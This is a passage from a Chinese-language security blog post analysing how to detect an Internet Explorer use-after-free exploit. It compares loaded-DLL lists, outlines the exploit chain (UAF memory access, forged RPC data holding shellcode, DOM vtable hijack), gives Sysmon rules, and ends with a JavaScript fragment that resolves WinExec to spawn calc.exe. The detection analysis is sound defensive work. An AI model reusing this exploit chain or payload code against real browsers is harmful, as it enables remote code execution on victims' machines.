ieframe.dll.mui	Internet 浏览器	Microsoft Corporation	C:\Windows\System32\zh-CN\ieframe.dll.mui
ieproxy.dll	IE ActiveX Interface Marshaling Library	Microsoft Corporation	C:\Windows\SysWOW64\ieproxy.dll
iertutil.dll	Internet Explorer 的运行时实用程序	Microsoft Corporation	C:\Windows\SysWOW64\iertutil.dll
IEShims.dll	Internet Explorer Compatibility Shims	Microsoft Corporation	C:\Program Files (x86)\Internet Explorer\IEShims.dll
ieui.dll	Internet Explorer UI 引擎	Microsoft Corporation	C:\Windows\SysWOW64\ieui.dll
iexplore.exe	Internet Explorer	Microsoft Corporation	C:\Program Files (x86)\Internet Explorer\iexplore.exe
iexplore.exe.mui	Internet Explorer	Microsoft Corporation	C:\Program Files\internet explorer\zh-CN\iexplore.exe.mui
imageres.dll	Windows Image Resource	Microsoft Corporation	C:\Windows\SysWOW64\imageres.dll
imageres.dll.mui	Windows Image Resource	Microsoft Corporation	C:\Windows\System32\en-US\imageres.dll.mui
imm32.dll	Multi-User Windows IMM32 API Client DLL	Microsoft Corporation	C:\Windows\SysWOW64\imm32.dll
IPHLPAPI.DLL	IP Helper API	Microsoft Corporation	C:\Windows\SysWOW64\IPHLPAPI.DLL
jscript9.dll	Microsoft (R) JScript	Microsoft Corporation	C:\Windows\SysWOW64\jscript9.dll
kernel.appcore.dll	AppModel API Host	Microsoft Corporation	C:\Windows\SysWOW64\kernel.appcore.dll
kernel32.dll	Windows NT BASE API Client DLL	Microsoft Corporation	C:\Windows\SysWOW64\kernel32.dll
KernelBase.dll	Windows NT BASE API Client DLL	Microsoft Corporation	C:\Windows\SysWOW64\KernelBase.dll
KernelBase.dll.mui	Windows NT 基本 API 客户端 DLL	Microsoft Corporation	C:\Windows\System32\zh-CN\KernelBase.dll.mui
locale.nls			C:\Windows\System32\locale.nls
mlang.dll	Multi Language Support DLL	Microsoft Corporation	C:\Windows\SysWOW64\mlang.dll
mlang.dll.mui	多语言支持 DLL	Microsoft Corporation	C:\Windows\System32\zh-CN\mlang.dll.mui
mpr.dll	Multiple Provider Router DLL	Microsoft Corporation	C:\Windows\SysWOW64\mpr.dll
msasn1.dll	ASN.1 Runtime APIs	Microsoft Corporation	C:\Windows\SysWOW64\msasn1.dll
msctf.dll	MSCTF Server DLL	Microsoft Corporation	C:\Windows\SysWOW64\msctf.dll
mshtml.dll	Microsoft (R) HTML 查看器	Microsoft Corporation	C:\Windows\SysWOW64\mshtml.dll
mshtml.dll.mui	Microsoft (R) HTML 查看器	Microsoft Corporation	C:\Windows\System32\zh-CN\mshtml.dll.mui
msi.dll	Windows Installer	Microsoft Corporation	C:\Windows\SysWOW64\msi.dll
msimtf.dll	Active IMM Server DLL	Microsoft Corporation	C:\Windows\SysWOW64\msimtf.dll
msIso.dll	Isolation Library for Internet Explorer	Microsoft Corporation	C:\Windows\SysWOW64\msIso.dll
msvcp_win.dll	Microsoft® C Runtime Library	Microsoft Corporation	C:\Windows\SysWOW64\msvcp_win.dll
msvcrt.dll	Windows NT CRT DLL	Microsoft Corporation	C:\Windows\SysWOW64\msvcrt.dll
mswsock.dll	Microsoft Windows Sockets 2.0 Service Provider	Microsoft Corporation	C:\Windows\SysWOW64\mswsock.dll
netapi32.dll	Net Win32 API DLL	Microsoft Corporation	C:\Windows\SysWOW64\netapi32.dll
netmsg.dll	网络消息 DLL	Microsoft Corporation	C:\Windows\SysWOW64\netmsg.dll
netmsg.dll.mui	网络消息 DLL	Microsoft Corporation	C:\Windows\System32\zh-CN\netmsg.dll.mui
netutils.dll	Net Win32 API Helpers DLL	Microsoft Corporation	C:\Windows\SysWOW64\netutils.dll
ninput.dll	Microsoft Pen and Touch Input Component	Microsoft Corporation	C:\Windows\SysWOW64\ninput.dll
nsi.dll	NSI User-mode interface DLL	Microsoft Corporation	C:\Windows\SysWOW64\nsi.dll
ntdll.dll	NT 层 DLL	Microsoft Corporation	C:\Windows\SysWOW64\ntdll.dll
ntdll.dll	NT 层 DLL	Microsoft Corporation	C:\Windows\System32\ntdll.dll
ntmarta.dll	Windows NT MARTA provider	Microsoft Corporation	C:\Windows\SysWOW64\ntmarta.dll
ole32.dll	Microsoft OLE for Windows	Microsoft Corporation	C:\Windows\SysWOW64\ole32.dll
oleaut32.dll	OLEAUT32.DLL	Microsoft Corporation	C:\Windows\SysWOW64\oleaut32.dll
OnDemandConnRouteHelper.dll	On Demand Connctiond Route Helper	Microsoft Corporation	C:\Windows\SysWOW64\OnDemandConnRouteHelper.dll
OneCoreCommonProxyStub.dll	OneCore Common Proxy Stub	Microsoft Corporation	C:\Windows\SysWOW64\OneCoreCommonProxyStub.dll
OneCoreUAPCommonProxyStub.dll	OneCoreUAP Common Proxy Stub	Microsoft Corporation	C:\Windows\SysWOW64\OneCoreUAPCommonProxyStub.dll
powrprof.dll	Power Profile Helper DLL	Microsoft Corporation	C:\Windows\SysWOW64\powrprof.dll
profapi.dll	User Profile Basic API	Microsoft Corporation	C:\Windows\SysWOW64\profapi.dll
propsys.dll	Microsoft 属性系统	Microsoft Corporation	C:\Windows\SysWOW64\propsys.dll
propsys.dll.mui	Microsoft 属性系统	Microsoft Corporation	C:\Windows\System32\zh-CN\propsys.dll.mui
R000000000006.clb			C:\Windows\Registration\R000000000006.clb
rmclient.dll	Resource Manager Client	Microsoft Corporation	C:\Windows\SysWOW64\rmclient.dll
rpcrt4.dll	远程过程调用运行时	Microsoft Corporation	C:\Windows\SysWOW64\rpcrt4.dll
scrrun.dll	Microsoft ® Script Runtime	Microsoft Corporation	C:\Windows\SysWOW64\scrrun.dll
scrrun.dll	Microsoft ® Script Runtime	Microsoft Corporation	C:\Windows\SysWOW64\scrrun.dll
sechost.dll	Host for SCM/SDDL/LSA Lookup APIs	Microsoft Corporation	C:\Windows\SysWOW64\sechost.dll
secur32.dll	Security Support Provider Interface	Microsoft Corporation	C:\Windows\SysWOW64\secur32.dll
SHCore.dll	SHCORE	Microsoft Corporation	C:\Windows\SysWOW64\SHCore.dll
shell32.dll	Windows Shell Common Dll	Microsoft Corporation	C:\Windows\SysWOW64\shell32.dll
shlwapi.dll	外壳简易实用工具库	Microsoft Corporation	C:\Windows\SysWOW64\shlwapi.dll
SortDefault.nls			C:\Windows\Globalization\Sorting\SortDefault.nls
srpapi.dll	SRP APIs Dll	Microsoft Corporation	C:\Windows\SysWOW64\srpapi.dll
sspicli.dll	Security Support Provider Interface	Microsoft Corporation	C:\Windows\SysWOW64\sspicli.dll
StaticCache.dat			C:\Windows\Fonts\StaticCache.dat
SuggestedSites.dat			C:\Users\bonelee\AppData\Local\Microsoft\Windows\INetCache\Low\SuggestedSites.dat
sxs.dll	Fusion 2.5	Microsoft Corporation	C:\Windows\SysWOW64\sxs.dll
TextInputFramework.dll	"TextInputFramework.DYNLINK"	Microsoft Corporation	C:\Windows\SysWOW64\TextInputFramework.dll
tokenbinding.dll	Token Binding Protocol	Microsoft Corporation	C:\Windows\SysWOW64\tokenbinding.dll
twinapi.appcore.dll	twinapi.appcore	Microsoft Corporation	C:\Windows\SysWOW64\twinapi.appcore.dll
ucrtbase.dll	Microsoft® C Runtime Library	Microsoft Corporation	C:\Windows\SysWOW64\ucrtbase.dll
urlmon.dll	Win32 的 OLE32 扩展	Microsoft Corporation	C:\Windows\SysWOW64\urlmon.dll
urlmon.dll.mui	Win32 的 OLE32 扩展	Microsoft Corporation	C:\Windows\System32\zh-CN\urlmon.dll.mui
user32.dll	多用户 Windows 用户 API 客户端 DLL	Microsoft Corporation	C:\Windows\SysWOW64\user32.dll
uxtheme.dll	Microsoft UxTheme Library	Microsoft Corporation	C:\Windows\SysWOW64\uxtheme.dll
vaultcli.dll	Credential Vault Client Library	Microsoft Corporation	C:\Windows\SysWOW64\vaultcli.dll
version.dll	Version Checking and File Installation Libraries	Microsoft Corporation	C:\Windows\SysWOW64\version.dll
vm3dum_10.dll	VMware SVGA 3D D3D10 Client Driver	VMware, Inc.	C:\Windows\SysWOW64\vm3dum_10.dll
vm3dum_loader.dll	VMware SVGA 3D Usermode Driver Loader	VMware, Inc.	C:\Windows\SysWOW64\vm3dum_loader.dll
win32u.dll	Win32u	Microsoft Corporation	C:\Windows\SysWOW64\win32u.dll
windows.storage.dll	Microsoft WinRT Storage API	Microsoft Corporation	C:\Windows\SysWOW64\windows.storage.dll
winhttp.dll	Windows HTTP Services	Microsoft Corporation	C:\Windows\SysWOW64\winhttp.dll
wininet.dll	Internet Extensions for Win32	Microsoft Corporation	C:\Windows\SysWOW64\wininet.dll
winmm.dll	MCI API DLL	Microsoft Corporation	C:\Windows\SysWOW64\winmm.dll
winmmbase.dll	Base Multimedia Extension API DLL	Microsoft Corporation	C:\Windows\SysWOW64\winmmbase.dll
winnsi.dll	Network Store Information RPC interface	Microsoft Corporation	C:\Windows\SysWOW64\winnsi.dll
wintrust.dll	Microsoft Trust Verification APIs	Microsoft Corporation	C:\Windows\SysWOW64\wintrust.dll
WinTypes.dll	Windows Base Types DLL	Microsoft Corporation	C:\Windows\SysWOW64\WinTypes.dll
wkscli.dll	Workstation Service Client DLL	Microsoft Corporation	C:\Windows\SysWOW64\wkscli.dll
wldp.dll	Windows Lockdown Policy	Microsoft Corporation	C:\Windows\SysWOW64\wldp.dll
wow64.dll	Win32 Emulation on NT64	Microsoft Corporation	C:\Windows\System32\wow64.dll
wow64cpu.dll	AMD64 Wow64 CPU 	Microsoft Corporation	C:\Windows\System32\wow64cpu.dll
wow64win.dll	Wow64 Console and Win32 API Logging	Microsoft Corporation	C:\Windows\System32\wow64win.dll
ws2_32.dll	Windows Socket 2.0 32-Bit DLL	Microsoft Corporation	C:\Windows\SysWOW64\ws2_32.dll

```

太多了，不知道问题在哪里！我单独创建一个正常的 html 文件，然后使用 ie 加载，文件内容如下：

```
<html>
start！
<script>
alert("hi");
</script>
</html>

```

 运行后，

 加载的 dll 如下：

```
Process: iexplore.exe Pid: 4808

Name	Description	Company Name	Path
{6AF0698E-D558-4F6E-9B3C-3716689AF493}.2.ver0x0000000000000001.db			C:\ProgramData\Microsoft\Windows\Caches\{6AF0698E-D558-4F6E-9B3C-3716689AF493}.2.ver0x0000000000000001.db
{AFBF9F1A-8EE8-4C77-AF34-C647E37CA0D9}.1.ver0x0000000000000001.db			C:\Users\bonelee\AppData\Local\Microsoft\Windows\Caches\{AFBF9F1A-8EE8-4C77-AF34-C647E37CA0D9}.1.ver0x0000000000000001.db
{DDF571F2-BE98-426D-8288-1A9A39C3FDA2}.2.ver0x0000000000000001.db			C:\ProgramData\Microsoft\Windows\Caches\{DDF571F2-BE98-426D-8288-1A9A39C3FDA2}.2.ver0x0000000000000001.db
~FontCache-FontFace.dat			C:\Windows\ServiceProfiles\LocalService\AppData\Local\FontCache\~FontCache-FontFace.dat
~FontCache-S-1-5-21-2730912745-1723166478-227975165-1000.dat			C:\Windows\ServiceProfiles\LocalService\AppData\Local\FontCache\~FontCache-S-1-5-21-2730912745-1723166478-227975165-1000.dat
~FontCache-System.dat			C:\Windows\ServiceProfiles\LocalService\AppData\Local\FontCache\~FontCache-System.dat
advapi32.dll	Advanced Windows 32 Base API	Microsoft Corporation	C:\Windows\SysWOW64\advapi32.dll
apphelp.dll	应用程序兼容性客户端库	Microsoft Corporation	C:\Windows\SysWOW64\apphelp.dll
bcrypt.dll	Windows Cryptographic Primitives Library (Wow64)	Microsoft Corporation	C:\Windows\SysWOW64\bcrypt.dll
bcryptprimitives.dll	Windows Cryptographic Primitives Library	Microsoft Corporation	C:\Windows\SysWOW64\bcryptprimitives.dll
C_1252.NLS			C:\Windows\System32\C_1252.NLS
cfgmgr32.dll	Configuration Manager DLL	Microsoft Corporation	C:\Windows\SysWOW64\cfgmgr32.dll
clbcatq.dll	COM+ Configuration Catalog	Microsoft Corporation	C:\Windows\SysWOW64\clbcatq.dll
combase.dll	Microsoft COM for Windows	Microsoft Corporation	C:\Windows\SysWOW64\combase.dll
comctl32.dll	用户体验控件库	Microsoft Corporation	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.17763.737_none_588eeadb78ace734\comctl32.dll
comctl32.dll	用户体验控件库	Microsoft Corporation	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.17763.737_none_4d637a531b9a7e51\comctl32.dll
comdlg32.dll	Common Dialogs DLL	Microsoft Corporation	C:\Windows\SysWOW64\comdlg32.dll
CoreMessaging.dll	Microsoft CoreMessaging Dll	Microsoft Corporation	C:\Windows\SysWOW64\CoreMessaging.dll
CoreUIComponents.dll	Microsoft Core UI Components Dll	Microsoft Corporation	C:\Windows\SysWOW64\CoreUIComponents.dll
crypt32.dll	Crypto API32	Microsoft Corporation	C:\Windows\SysWOW64\crypt32.dll
cryptbase.dll	Base cryptographic API DLL	Microsoft Corporation	C:\Windows\SysWOW64\cryptbase.dll
cryptsp.dll	Cryptographic Service Provider API	Microsoft Corporation	C:\Windows\SysWOW64\cryptsp.dll
cversions.2.db			C:\ProgramData\Microsoft\Windows\Caches\cversions.2.db
cversions.2.db			C:\ProgramData\Microsoft\Windows\Caches\cversions.2.db
d2d1.dll	Microsoft D2D Library	Microsoft Corporation	C:\Windows\SysWOW64\d2d1.dll
d3d11.dll	Direct3D 11 Runtime	Microsoft Corporation	C:\Windows\SysWOW64\d3d11.dll
DataExchange.dll	Data exchange	Microsoft Corporation	C:\Windows\SysWOW64\DataExchange.dll
dcomp.dll	Microsoft DirectComposition Library	Microsoft Corporation	C:\Windows\SysWOW64\dcomp.dll
directmanipulation.dll	Microsoft Direct Manipulation Component	Microsoft Corporation	C:\Windows\SysWOW64\directmanipulation.dll
dwmapi.dll	Microsoft Desktop Window Manager API	Microsoft Corporation	C:\Windows\SysWOW64\dwmapi.dll
DWrite.dll	Microsoft DirectX Typography Services	Microsoft Corporation	C:\Windows\SysWOW64\DWrite.dll
dxgi.dll	DirectX Graphics Infrastructure	Microsoft Corporation	C:\Windows\SysWOW64\dxgi.dll
efswrt.dll	Storage Protection Windows Runtime DLL	Microsoft Corporation	C:\Windows\SysWOW64\efswrt.dll
gdi32.dll	GDI Client DLL	Microsoft Corporation	C:\Windows\SysWOW64\gdi32.dll
gdi32full.dll	GDI Client DLL	Microsoft Corporation	C:\Windows\SysWOW64\gdi32full.dll
ieapfltr.dll	Microsoft SmartScreen Filter	Microsoft Corporation	C:\Windows\SysWOW64\ieapfltr.dll
ieframe.dll	Internet 浏览器	Microsoft Corporation	C:\Windows\SysWOW64\ieframe.dll
ieframe.dll.mui	Internet 浏览器	Microsoft Corporation	C:\Windows\System32\zh-CN\ieframe.dll.mui
ieproxy.dll	IE ActiveX Interface Marshaling Library	Microsoft Corporation	C:\Windows\SysWOW64\ieproxy.dll
iertutil.dll	Internet Explorer 的运行时实用程序	Microsoft Corporation	C:\Windows\SysWOW64\iertutil.dll
IEShims.dll	Internet Explorer Compatibility Shims	Microsoft Corporation	C:\Program Files (x86)\Internet Explorer\IEShims.dll
ieui.dll	Internet Explorer UI 引擎	Microsoft Corporation	C:\Windows\SysWOW64\ieui.dll
iexplore.exe	Internet Explorer	Microsoft Corporation	C:\Program Files (x86)\Internet Explorer\iexplore.exe
iexplore.exe.mui	Internet Explorer	Microsoft Corporation	C:\Program Files\internet explorer\zh-CN\iexplore.exe.mui
imageres.dll	Windows Image Resource	Microsoft Corporation	C:\Windows\SysWOW64\imageres.dll
imageres.dll.mui	Windows Image Resource	Microsoft Corporation	C:\Windows\System32\en-US\imageres.dll.mui
imm32.dll	Multi-User Windows IMM32 API Client DLL	Microsoft Corporation	C:\Windows\SysWOW64\imm32.dll
IPHLPAPI.DLL	IP Helper API	Microsoft Corporation	C:\Windows\SysWOW64\IPHLPAPI.DLL
jscript9.dll	Microsoft (R) JScript	Microsoft Corporation	C:\Windows\SysWOW64\jscript9.dll
kernel.appcore.dll	AppModel API Host	Microsoft Corporation	C:\Windows\SysWOW64\kernel.appcore.dll
kernel32.dll	Windows NT BASE API Client DLL	Microsoft Corporation	C:\Windows\SysWOW64\kernel32.dll
KernelBase.dll	Windows NT BASE API Client DLL	Microsoft Corporation	C:\Windows\SysWOW64\KernelBase.dll
locale.nls			C:\Windows\System32\locale.nls
mlang.dll	Multi Language Support DLL	Microsoft Corporation	C:\Windows\SysWOW64\mlang.dll
mlang.dll.mui	多语言支持 DLL	Microsoft Corporation	C:\Windows\System32\zh-CN\mlang.dll.mui
mpr.dll	Multiple Provider Router DLL	Microsoft Corporation	C:\Windows\SysWOW64\mpr.dll
msasn1.dll	ASN.1 Runtime APIs	Microsoft Corporation	C:\Windows\SysWOW64\msasn1.dll
msctf.dll	MSCTF Server DLL	Microsoft Corporation	C:\Windows\SysWOW64\msctf.dll
mshtml.dll	Microsoft (R) HTML 查看器	Microsoft Corporation	C:\Windows\SysWOW64\mshtml.dll
mshtml.dll.mui	Microsoft (R) HTML 查看器	Microsoft Corporation	C:\Windows\System32\zh-CN\mshtml.dll.mui
msimtf.dll	Active IMM Server DLL	Microsoft Corporation	C:\Windows\SysWOW64\msimtf.dll
msIso.dll	Isolation Library for Internet Explorer	Microsoft Corporation	C:\Windows\SysWOW64\msIso.dll
msvcp_win.dll	Microsoft® C Runtime Library	Microsoft Corporation	C:\Windows\SysWOW64\msvcp_win.dll
msvcrt.dll	Windows NT CRT DLL	Microsoft Corporation	C:\Windows\SysWOW64\msvcrt.dll
mswsock.dll	Microsoft Windows Sockets 2.0 Service Provider	Microsoft Corporation	C:\Windows\SysWOW64\mswsock.dll
netapi32.dll	Net Win32 API DLL	Microsoft Corporation	C:\Windows\SysWOW64\netapi32.dll
netutils.dll	Net Win32 API Helpers DLL	Microsoft Corporation	C:\Windows\SysWOW64\netutils.dll
ninput.dll	Microsoft Pen and Touch Input Component	Microsoft Corporation	C:\Windows\SysWOW64\ninput.dll
nsi.dll	NSI User-mode interface DLL	Microsoft Corporation	C:\Windows\SysWOW64\nsi.dll
ntdll.dll	NT 层 DLL	Microsoft Corporation	C:\Windows\SysWOW64\ntdll.dll
ntdll.dll	NT 层 DLL	Microsoft Corporation	C:\Windows\System32\ntdll.dll
ntmarta.dll	Windows NT MARTA provider	Microsoft Corporation	C:\Windows\SysWOW64\ntmarta.dll
ole32.dll	Microsoft OLE for Windows	Microsoft Corporation	C:\Windows\SysWOW64\ole32.dll
oleaut32.dll	OLEAUT32.DLL	Microsoft Corporation	C:\Windows\SysWOW64\oleaut32.dll
OnDemandConnRouteHelper.dll	On Demand Connctiond Route Helper	Microsoft Corporation	C:\Windows\SysWOW64\OnDemandConnRouteHelper.dll
OneCoreCommonProxyStub.dll	OneCore Common Proxy Stub	Microsoft Corporation	C:\Windows\SysWOW64\OneCoreCommonProxyStub.dll
OneCoreUAPCommonProxyStub.dll	OneCoreUAP Common Proxy Stub	Microsoft Corporation	C:\Windows\SysWOW64\OneCoreUAPCommonProxyStub.dll
powrprof.dll	Power Profile Helper DLL	Microsoft Corporation	C:\Windows\SysWOW64\powrprof.dll
profapi.dll	User Profile Basic API	Microsoft Corporation	C:\Windows\SysWOW64\profapi.dll
propsys.dll	Microsoft 属性系统	Microsoft Corporation	C:\Windows\SysWOW64\propsys.dll
propsys.dll.mui	Microsoft 属性系统	Microsoft Corporation	C:\Windows\System32\zh-CN\propsys.dll.mui
R000000000006.clb			C:\Windows\Registration\R000000000006.clb
rmclient.dll	Resource Manager Client	Microsoft Corporation	C:\Windows\SysWOW64\rmclient.dll
rpcrt4.dll	远程过程调用运行时	Microsoft Corporation	C:\Windows\SysWOW64\rpcrt4.dll
sechost.dll	Host for SCM/SDDL/LSA Lookup APIs	Microsoft Corporation	C:\Windows\SysWOW64\sechost.dll
secur32.dll	Security Support Provider Interface	Microsoft Corporation	C:\Windows\SysWOW64\secur32.dll
SHCore.dll	SHCORE	Microsoft Corporation	C:\Windows\SysWOW64\SHCore.dll
shell32.dll	Windows Shell Common Dll	Microsoft Corporation	C:\Windows\SysWOW64\shell32.dll
shlwapi.dll	外壳简易实用工具库	Microsoft Corporation	C:\Windows\SysWOW64\shlwapi.dll
simsun.ttc			C:\Windows\Fonts\simsun.ttc
SortDefault.nls			C:\Windows\Globalization\Sorting\SortDefault.nls
srpapi.dll	SRP APIs Dll	Microsoft Corporation	C:\Windows\SysWOW64\srpapi.dll
sspicli.dll	Security Support Provider Interface	Microsoft Corporation	C:\Windows\SysWOW64\sspicli.dll
StaticCache.dat			C:\Windows\Fonts\StaticCache.dat
SuggestedSites.dat			C:\Users\bonelee\AppData\Local\Microsoft\Windows\INetCache\Low\SuggestedSites.dat
TextInputFramework.dll	"TextInputFramework.DYNLINK"	Microsoft Corporation	C:\Windows\SysWOW64\TextInputFramework.dll
tokenbinding.dll	Token Binding Protocol	Microsoft Corporation	C:\Windows\SysWOW64\tokenbinding.dll
twinapi.appcore.dll	twinapi.appcore	Microsoft Corporation	C:\Windows\SysWOW64\twinapi.appcore.dll
ucrtbase.dll	Microsoft® C Runtime Library	Microsoft Corporation	C:\Windows\SysWOW64\ucrtbase.dll
urlmon.dll	Win32 的 OLE32 扩展	Microsoft Corporation	C:\Windows\SysWOW64\urlmon.dll
urlmon.dll.mui	Win32 的 OLE32 扩展	Microsoft Corporation	C:\Windows\System32\zh-CN\urlmon.dll.mui
user32.dll	多用户 Windows 用户 API 客户端 DLL	Microsoft Corporation	C:\Windows\SysWOW64\user32.dll
uxtheme.dll	Microsoft UxTheme Library	Microsoft Corporation	C:\Windows\SysWOW64\uxtheme.dll
vaultcli.dll	Credential Vault Client Library	Microsoft Corporation	C:\Windows\SysWOW64\vaultcli.dll
version.dll	Version Checking and File Installation Libraries	Microsoft Corporation	C:\Windows\SysWOW64\version.dll
vm3dum_10.dll	VMware SVGA 3D D3D10 Client Driver	VMware, Inc.	C:\Windows\SysWOW64\vm3dum_10.dll
vm3dum_loader.dll	VMware SVGA 3D Usermode Driver Loader	VMware, Inc.	C:\Windows\SysWOW64\vm3dum_loader.dll
win32u.dll	Win32u	Microsoft Corporation	C:\Windows\SysWOW64\win32u.dll
windows.storage.dll	Microsoft WinRT Storage API	Microsoft Corporation	C:\Windows\SysWOW64\windows.storage.dll
winhttp.dll	Windows HTTP Services	Microsoft Corporation	C:\Windows\SysWOW64\winhttp.dll
wininet.dll	Internet Extensions for Win32	Microsoft Corporation	C:\Windows\SysWOW64\wininet.dll
winmm.dll	MCI API DLL	Microsoft Corporation	C:\Windows\SysWOW64\winmm.dll
winmmbase.dll	Base Multimedia Extension API DLL	Microsoft Corporation	C:\Windows\SysWOW64\winmmbase.dll
winnsi.dll	Network Store Information RPC interface	Microsoft Corporation	C:\Windows\SysWOW64\winnsi.dll
wintrust.dll	Microsoft Trust Verification APIs	Microsoft Corporation	C:\Windows\SysWOW64\wintrust.dll
WinTypes.dll	Windows Base Types DLL	Microsoft Corporation	C:\Windows\SysWOW64\WinTypes.dll
wkscli.dll	Workstation Service Client DLL	Microsoft Corporation	C:\Windows\SysWOW64\wkscli.dll
wldp.dll	Windows Lockdown Policy	Microsoft Corporation	C:\Windows\SysWOW64\wldp.dll
wow64.dll	Win32 Emulation on NT64	Microsoft Corporation	C:\Windows\System32\wow64.dll
wow64cpu.dll	AMD64 Wow64 CPU 	Microsoft Corporation	C:\Windows\System32\wow64cpu.dll
wow64win.dll	Wow64 Console and Win32 API Logging	Microsoft Corporation	C:\Windows\System32\wow64win.dll
ws2_32.dll	Windows Socket 2.0 32-Bit DLL	Microsoft Corporation	C:\Windows\SysWOW64\ws2_32.dll

```

我们使用 diff 工具比较下差异：左边是 hello world 正常网页，右边是有上述漏洞页面的 dll 清单【从检测上看用处不大】

![](img/ada266016fa2483a5b6275732bfc3225.png)

![](img/d565e2b1a968b7926159740defc910f6.png)

![](img/849d0ff8b789f998f537a06f13c23c46.png)

好了，看到核心的几个 dll 加载了！见后 sysmon 采集数据分析。

此外，还有 handles 的情况，diff 比较的话，差异还很大：

![](img/d5275787a8675294cccdc2dc53edeefc.png)

![](img/26c98e58b875c8726f968702e54ced04.png)

![](img/84ad4f61fbf16afd508e3334fd8c1e34.png)

![](img/0dd48ac27c43ca57e499e143c35bae8a.png)

先说核心流程（见后原理分析）：

利用 UAF 读写内存==》在内存里构造恶意 rpc 数据，内含 rpc call back 函数指针（这个就是恶意代码！shellcode 在里面）==》修改 dom 的虚表函数，替换自己想要执行的 rpc 函数==》构造 dom 元素，让 js 去执行 rpc==》rpc 执行，回调 callback，执行恶意代码

如何检测？我们分析下检测点在哪里？

1、利用 UAF 读写内存==》从 uaf 检测视角看，需要跟踪浏览器里的各个对象的释放和读取情况，几乎是不可行的！当然，这里面肯定有修改内存读写和执行属性，这里可以成为检测点。==》从后面知道，sysmon 是看不到的！

2、在内存里构造恶意 rpc 数据，内含 rpc call back 函数指针（这个就是恶意代码！shellcode 在里面）==》从检测看，rpc 调用是标准规范，恶意代码在回调的函数里，*****所以应检测这个恶意的回调函数****。==》可以看到 fork 的可疑 calc.exe 子进程！

3、修改 dom 的虚表函数，替换自己想要执行的 rpc 函数==》浏览器自己检查不严格机制造成的，本例看都是 dom 内部自己的函数替换，从检测视角看很难，得去记录每一个 dom 事件的虚表，看是否有替换。

4、构造 dom 元素，让 js 去执行 rpc==》浏览器 dom 的机制而已。

5、rpc 执行，回调 callback，执行恶意代码==》浏览器 dom 事件的各种 callback 调用。

用 sysmon 采集下前面复现的案例，看看检测点！典型配置增加下采集规则（主要还是 image 的加载采集）：

```
	<!--SYSMON EVENT ID 7 : DLL (IMAGE) LOADED BY PROCESS [ImageLoad]-->
		<!--COMMENT:	Can cause high system load, disabled by default.-->
		<!--COMMENT:	[ https://attack.mitre.org/wiki/Technique/T1073 ] [ https://attack.mitre.org/wiki/Technique/T1038 ] [ https://attack.mitre.org/wiki/Technique/T1034 ] -->

		<!--DATA: UtcTime, ProcessGuid, ProcessId, Image, ImageLoaded, Hashes, Signed, Signature, SignatureStatus-->
	<RuleGroup name="" groupRelation="or">
		<ImageLoad onmatch="exclude">
			<!--NOTE: Using "include" with no rules means nothing in this section will be logged-->
		</ImageLoad>
	</RuleGroup>

	<!--SYSMON EVENT ID 8 : REMOTE THREAD CREATED [CreateRemoteThread]-->
		<!--COMMENT:	Monitor for processes injecting code into other processes. Often used by malware to cloak their actions. Also when Firefox loads Flash.
		[ https://attack.mitre.org/wiki/Technique/T1055 ] -->

		<!--DATA: UtcTime, SourceProcessGuid, SourceProcessId, SourceImage, TargetProcessId, TargetImage, NewThreadId, StartAddress, StartModule, StartFunction-->
	<RuleGroup name="" groupRelation="or">
		<CreateRemoteThread onmatch="exclude">
			<!--COMMENT: Exclude mostly-safe sources and log anything else.-->			
		</CreateRemoteThread>
	</RuleGroup>

	<!--SYSMON EVENT ID 9 : RAW DISK ACCESS [RawAccessRead]-->
		<!--EVENT 9: "RawAccessRead detected"-->
		<!--COMMENT:	Can cause high system load, disabled by default.-->
		<!--COMMENT:	Monitor for raw sector-level access to the disk, often used to bypass access control lists or access locked files.
			Disabled by default since including even one entry here activates this component. Reward/performance/rule maintenance decision.
			Encourage you to experiment with this feature yourself. [ https://attack.mitre.org/wiki/Technique/T1067 ] -->
		<!--COMMENT:	You will likely want to set this to a full capture on domain controllers, where no process should be doing raw reads.-->

		<!--DATA: UtcTime, ProcessGuid, ProcessId, Image, Device-->
	<RuleGroup name="" groupRelation="or">
		<RawAccessRead onmatch="exclude">
			<!--NOTE: Using "include" with no rules means nothing in this section will be logged-->
		</RawAccessRead>
	</RuleGroup>

	<!--SYSMON EVENT ID 10 : INTER-PROCESS ACCESS [ProcessAccess]-->
		<!--EVENT 10: "Process accessed"-->
		<!--COMMENT:	Can cause high system load, disabled by default.-->
		<!--COMMENT:	Monitor for processes accessing other process' memory.-->

		<!--DATA: UtcTime, SourceProcessGuid, SourceProcessId, SourceThreadId, SourceImage, TargetProcessGuid, TargetProcessId, TargetImage, GrantedAccess, CallTrace-->
	<RuleGroup name="" groupRelation="or">
		<ProcessAccess onmatch="include">
			<!--NOTE: Using "include" with no rules means nothing in this section will be logged-->
		</ProcessAccess>
	</RuleGroup>

```

首先看到的是启动了 IE，打开了包含 uaf 漏洞利用的 1809.html 网页：

![](img/8e277c853b71c663a2f748b68513f297.png)

然后是创建了 IE 子进程，因为每一个 tab 标签页都会启动 IE 子进程：

![](img/d98fb28a602547db39feb78d4bfdecec.png)

IE 子进程里加载 rpc runtime DLL：

![](img/04787dafa758adbc3670c8a1a8b2fb67.png)

继续加载 iframe 和 html viewer DLL：

![](img/015fd88ed23c64f2a57045ccfd29304a.png)

![](img/514d689da171c57366d7ade02b7bb770.png)

IE 加载 JS 引擎：

![](img/44e2df01d4eed0248e17f5d716fe4e85.png)

IE 调用 RPC proxy stub DLL：

![](img/341c22bfd7751169704b713405fff863.png)

IE 加载 script runtime dll 和 sxs.dll：

![](img/041caa65421877074dcf3ff982ba0af5.png)

![](img/9378851b70d16779dfa23ce7396b9d8d.png)

这个 sxs.dll 是啥作用？微软官方的说法是用来做查詢、安裝、卸載安装的程序服务。见：https://learn.microsoft.com/zh-hk/windows/win32/api/winsxs/

![](img/74b6b03af54d0943cc105c899d32c435.png)

然后看到 IE 里 fork 了 calc.exe：

![](img/2367f957210fd4d6614b7e97506238fa.png)

calc.exe 调用 rpc runtime dll：

![](img/fc42f58e74c1b91442fd29d88946c27c.png)

ie 加载 msi.dll：==》*msi*.*dll*是 Windows 安装程序 MSI(Microsoft Installer)相关模块

![](img/b02367e7e547077cbd6982898224590f.png)

 对应代码：

```
// 调用 API,弹出计算器
// 通过在 kernel32.dll 模块导出表中查找 WinExec 函数的地址，然后使用其执行了命令行 calc.exe 
var kernel32 = call2(LoadLibraryExA,[newStr('kernel32.dll',0,1)])
var WinExec = getProcAddr(kernel32,'WinExec')
